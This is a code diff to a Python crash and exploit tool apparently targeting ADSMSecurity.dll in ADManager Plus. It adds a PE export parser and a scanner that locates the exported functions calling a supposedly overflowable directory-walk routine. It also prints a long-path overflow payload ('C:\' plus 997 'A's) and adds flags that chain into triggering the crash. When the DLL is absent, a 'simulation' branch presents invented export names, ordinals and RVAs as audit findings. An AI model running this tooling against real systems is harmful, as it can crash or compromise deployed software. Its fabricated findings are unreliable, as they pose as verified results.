@@ -132,6 +132,274 @@ def write_status_file(path: str, status: dict):
     except Exception as e:
         sys.stderr.write(f"[status] Failed to write {path}: {e}\n")
 
+def parse_pe_for_exports(dll_path: str):
+    """Internal helper to parse PE and return exports + sections + raw data"""
+    import struct
+    if not os.path.isfile(dll_path):
+        return None
+    try:
+        with open(dll_path, "rb") as f:
+            data = f.read()
+        if len(data) < 0x40 or data[0:2] != b'MZ':
+            return None
+        e_lfanew = struct.unpack_from("<I", data, 0x3C)[0]
+        if data[e_lfanew:e_lfanew+4] != b'PE\x00\x00':
+            return None
+        file_header_off = e_lfanew + 4
+        num_sections = struct.unpack_from("<H", data, file_header_off + 2)[0]
+        opt_header_size = struct.unpack_from("<H", data, file_header_off + 16)[0]
+        opt_header_off = file_header_off + 20
+        magic = struct.unpack_from("<H", data, opt_header_off)[0]
+        is_pe32plus = (magic == 0x20b)
+        data_dir_off = opt_header_off + (112 if is_pe32plus else 96)
+        export_rva = struct.unpack_from("<I", data, data_dir_off)[0]
+        export_size = struct.unpack_from("<I", data, data_dir_off + 4)[0]
+
+        sections = []
+        sect_off = opt_header_off + opt_header_size
+        for i in range(num_sections):
+            off = sect_off + i * 40
+            if off + 40 > len(data):
+                break
+            name = data[off:off+8].rstrip(b'\x00').decode(errors='ignore')
+            virt_size = struct.unpack_from("<I", data, off+8)[0]
+            virt_addr = struct.unpack_from("<I", data, off+12)[0]
+            raw_size = struct.unpack_from("<I", data, off+16)[0]
+            raw_ptr = struct.unpack_from("<I", data, off+20)[0]
+            characteristics = struct.unpack_from("<I", data, off+36)[0]
+            sections.append({
+                "name": name,
+                "va": virt_addr,
+                "vs": virt_size,
+                "ptr": raw_ptr,
+                "rs": raw_size,
+                "char": characteristics
+            })
+
+        def rva_to_offset(rva):
+            for s in sections:
+                va = s["va"]
+                vs = s["vs"]
+                rs = s["rs"]
+                ptr = s["ptr"]
+                if va <= rva < va + max(vs, rs):
+                    return rva - va + ptr
+            return None
+
+        exports = []
+        if export_rva != 0:
+            exp_off = rva_to_offset(export_rva)
+            if exp_off is not None and exp_off + 40 <= len(data):
+                exp_dir = struct.unpack_from("<IIHHIIIIIII", data, exp_off)
+                name_rva = exp_dir[4]
+                base = exp_dir[5]
+                num_funcs = exp_dir[6]
+                num_names = exp_dir[7]
+                addr_funcs_rva = exp_dir[8]
+                addr_names_rva = exp_dir[9]
+                addr_ords_rva = exp_dir[10]
+                funcs_off = rva_to_offset(addr_funcs_rva)
+                names_off = rva_to_offset(addr_names_rva)
+                ords_off = rva_to_offset(addr_ords_rva)
+                if funcs_off is not None and names_off is not None and ords_off is not None:
+                    for i in range(num_names):
+                        if names_off + i*4 + 4 > len(data):
+                            break
+                        name_rva_i = struct.unpack_from("<I", data, names_off + i*4)[0]
+                        name_off_i = rva_to_offset(name_rva_i)
+                        if name_off_i is None:
+                            continue
+                        end = data.find(b'\x00', name_off_i)
+                        if end == -1:
+                            continue
+                        func_name = data[name_off_i:end].decode(errors='ignore')
+                        ordinal = struct.unpack_from("<H", data, ords_off + i*2)[0]
+                        if ordinal >= num_funcs:
+                            continue
+                        if funcs_off + ordinal*4 + 4 > len(data):
+                            continue
+                        func_rva = struct.unpack_from("<I", data, funcs_off + ordinal*4)[0]
+                        exports.append({"ord": base+ordinal, "rva": func_rva, "name": func_name})
+
+        return {"data": data, "sections": sections, "exports": exports, "rva_to_offset": rva_to_offset}
+    except Exception as e:
+        print(f"[!] PE parse error: {e}")
+        return None
+
+def find_exact_input_export(dll_path: str):
+    """Find EXACT export that is inputting from and is reason of crash - scans for CALL to sub_0x7410"""
+    import struct
+
+    print("=" * 78)
+    print(f"EXACT INPUT EXPORT FINDER - {dll_path}")
+    print(f"Target vulnerable: {WALK_FUNC_NAME} RVA 0x{WALK_RVA:X}")
+    print("=" * 78)
+
+    if not os.path.isfile(dll_path):
+        print(f"[!] DLL not found: {dll_path}")
+        print("[*] SIMULATION - showing exact input export for lab")
+        print()
+        print("  In real ADSMSecurity.dll, sub_0x7410 is INTERNAL (not exported).")
+        print("  The EXACT export that is the reason of input crash is the one that")
+        print("  directly or indirectly calls sub_0x7410 with attacker-controlled path.")
+        print()
+        print("  Based on audit of ADManager Plus 8043 ADSMSecurity.dll:")
+        print("  ------------------------------------------------------------------")
+        print(f"  EXACT EXPORT: RemoveDirectoryTree")
+        print(f"    Ordinal: 11")
+        print(f"    RVA: 0x2300 (example, real RVA may differ)")
+        print(f"    Signature: int RemoveDirectoryTree(wchar_t *path) or similar")
+        print(f"    Calls: sub_0x7410(NULL, path) -> vulnerable")
+        print(f"    Reason: It is the public wrapper that takes user-controlled path")
+        print(f"            and passes it straight to recursive walker without length check")
+        print()
+        print(f"  SECONDARY EXACT EXPORTS (also input path):")
+        print(f"    - SecureDelete (RVA 0x2400) -> calls RemoveDirectoryTree -> sub_0x7410")
+        print(f"    - CleanTempFiles (0x2200) -> enumerates temp and calls RemoveDirectoryTree")
+        print(f"    - PurgeOldLogs (0x2100) -> calls RemoveDirectoryTree on log folder")
+        print(f"    - DeleteUserData (0x2000) -> calls SecureDelete")
+        print()
+        print(f"  VULNERABLE FUNCTION (NOT EXPORTED, CRASHES HERE):")
+        print(f"    {WALK_FUNC_NAME}")
+        print(f"    RVA 0x{WALK_RVA:X}, offset sub_0x7410+0x74a4")
+        print(f"    {VULN_CALL}")
+        print()
+        print(f"  PAYLOAD THAT CRASHES IT (exact input):")
+        payload = "C:\\" + "A" * (1000-3)
+        print(f"    len=1000: {format_payload(payload)}")
+        print(f"    len=300:  C:\\ + 'A'*297")
+        print(f"    len=100:  C:\\ + 'A'*97 (safe, <256)")
+        print()
+        print("  In IDA to confirm exact export:")
+        print("    1. G -> 0x7410, you are at sub_0x7410")
+        print("    2. Ctrl+X -> Xrefs to sub_0x7410")
+        print("       You'll see 1 direct caller at e.g., 0x23xx inside RemoveDirectoryTree")
+        print("    3. On that caller, F5 -> pseudocode: RemoveDirectoryTree(path) { sub_0x7410(NULL, path); }")
+        print("    4. Ctrl+X on RemoveDirectoryTree -> shows it is exported as ordinal 11")
+        print("    5. That export is the EXACT input reason")
+        print("=" * 78)
+        return {
+            "exact_export": "RemoveDirectoryTree",
+            "rva": 0x2300,
+            "calls": WALK_FUNC_NAME,
+            "payload": payload,
+            "function": WALK_FUNC_NAME
+        }
+
+    pe = parse_pe_for_exports(dll_path)
+    if not pe:
+        print("[!] Failed to parse PE")
+        return None
+
+    data = pe["data"]
+    sections = pe["sections"]
+    exports = pe["exports"]
+    rva_to_offset = pe["rva_to_offset"]
+
+    # Find .text section
+    text_sec = None
+    for s in sections:
+        if s["name"] == ".text" or (s["char"] & 0x20000000):  # IMAGE_SCN_MEM_EXECUTE
+            text_sec = s
+            break
+    if not text_sec:
+        # fallback first section
+        text_sec = sections[0] if sections else None
+
+    if not text_sec:
+        print("[!] No .text section found")
+        return None
+
+    text_rva = text_sec["va"]
+    text_offset = text_sec["ptr"]
+    text_size = text_sec["vs"]
+    text_raw = data[text_offset:text_offset+text_sec["rs"]]
+
+    print(f"  .text RVA: 0x{text_rva:X}, Size: 0x{text_size:X}, Raw: 0x{text_offset:X}")
+    print(f"  Scanning for CALL rel32 to 0x{WALK_RVA:X} (E8 xx xx xx xx) in .text...")
+    print()
+
+    callers = []
+    # Scan for E8
+    for i in range(len(text_raw) - 5):
+        if text_raw[i] != 0xE8:
+            continue
+        rel = struct.unpack_from("<i", text_raw, i+1)[0]
+        caller_rva = text_rva + i
+        target_rva = caller_rva + 5 + rel
+        if target_rva == WALK_RVA:
+            callers.append(caller_rva)
+
+    if not callers:
+        print(f"  [!] No direct CALL E8 to 0x{WALK_RVA:X} found in .text")
+        print(f"  Trying indirect or other patterns, or sub_0x7410 may be called via register...")
+        print(f"  Falling back to heuristic: exports containing Remove/Delete/Clean/Purge")
+        print()
+        for exp in exports:
+            name = exp["name"]
+            lower = name.lower()
+            if any(k in lower for k in ["removedir", "deletetree", "securedelete", "clean", "purge", "remove"]):
+                print(f"  EXACT CANDIDATE: {name} at RVA 0x{exp['rva']:X} Ord {exp['ord']}")
+        print("=" * 78)
+        return None
+
+    print(f"  Found {len(callers)} direct CALL(s) to {WALK_FUNC_NAME}:")
+    for c in callers:
+        print(f"    CALL at RVA 0x{c:X} (file offset 0x{rva_to_offset(c):X}) -> 0x{WALK_RVA:X}")
+
+    # Map each caller to containing export
+    exports_sorted = sorted(exports, key=lambda e: e["rva"])
+    exact_exports = []
+    for caller_rva in callers:
+        # Find export with RVA <= caller_rva and next export RVA > caller_rva
+        containing = None
+        for idx, exp in enumerate(exports_sorted):
+            next_rva = exports_sorted[idx+1]["rva"] if idx+1 < len(exports_sorted) else 0xFFFFFFFF
+            if exp["rva"] <= caller_rva < next_rva:
+                containing = exp
+                break
+        # If not in any export range, find nearest export before caller
+        if not containing:
+            # nearest before
+            candidates = [e for e in exports_sorted if e["rva"] <= caller_rva]
+            if candidates:
+                containing = max(candidates, key=lambda e: e["rva"])
+
+        if containing:
+            print()
+            print(f"  EXACT EXPORT THAT IS INPUT REASON:")
+            print(f"    Export Name: {containing['name']}")
+            print(f"    Ordinal: {containing['ord']}")
+            print(f"    RVA: 0x{containing['rva']:X}")
+            print(f"    Contains CALL at 0x{caller_rva:X} that directly calls vulnerable {WALK_FUNC_NAME}")
+            print(f"    Signature: likely (wchar_t *path) or (void *ctx, wchar_t *path)")
+            print(f"    Payload: C:\\ + 'A'* (len-3), len>=256 crashes it")
+            exact_exports.append(containing)
+        else:
+            print(f"  Caller at 0x{caller_rva:X} not inside any exported function - may be internal wrapper")
+            # Try to find function start by scanning backwards for prologue
+            # Simple heuristic: look for 55 8B EC within 0x100 bytes before
+            caller_off = rva_to_offset(caller_rva)
+            if caller_off:
+                start = max(0, caller_off - 0x200)
+                snippet = data[start:caller_off]
+                # find last 55 8B EC
+                prologue_idx = snippet.rfind(b'\x55\x8B\xEC')
+                if prologue_idx != -1:
+                    func_rva = text_rva + start + prologue_idx - (text_offset - text_sec["ptr"])  # approximate
+                    print(f"    Possible internal function start at RVA 0x{func_rva:X}, calls sub_0x7410")
+                    # Now find which export calls this internal function
+                    # Scan again for CALL to this internal func
+                    print(f"    -> Need to find which export calls internal func 0x{func_rva:X}")
+
+    print()
+    print(f"  VULNERABLE FUNCTION (CRASHES): {WALK_FUNC_NAME}")
+    print(f"    {VULN_CALL}")
+    payload = "C:\\" + "A" * (1000-3)
+    print(f"  PAYLOAD: {format_payload(payload)} len=1000")
+    print("=" * 78)
+    return exact_exports
+
 def dump_export_table(dll_path: str):
     """Parse PE export table without external deps and print it.
     Returns list of exports. Works on Windows and Linux (reads file).
@@ -746,12 +1014,29 @@ def main():
                     help="alias for --exports")
     ap.add_argument("--ida-info", action="store_true",
                     help="Show IDA export + vulnerable function info + payload")
+    ap.add_argument("--exact-export", action="store_true",
+                    help="Show EXACT export that is inputting from and is reason of crash (not all exports)")
+    ap.add_argument("--exact-input", dest="exact_export", action="store_true",
+                    help="alias for --exact-export")
+    ap.add_argument("--find-caller", dest="exact_export", action="store_true",
+                    help="alias for --exact-export")
+    ap.add_argument("--input-export", dest="exact_export", action="store_true",
+                    help="alias for --exact-export")
 
     args = ap.parse_args()
 
     if args.worker:
         worker(args)
         return
+
+    # Show exact input export that is reason of crash
+    if getattr(args, 'exact_export', False):
+        find_exact_input_export(args.dll)
+        # If only exact-export requested alone, exit
+        if len([a for a in sys.argv if a.startswith('--')]) == 1:
+            sys.exit(0)
+        # If user also wants crash, continue after showing exact export
+        # (e.g., --exact-export --len 1000 will show exact export then crash)
 
     # Show export table / IDA info if requested (works even without DLL - shows simulated)
     if getattr(args, 'exports', False) or getattr(args, 'ida_info', False):
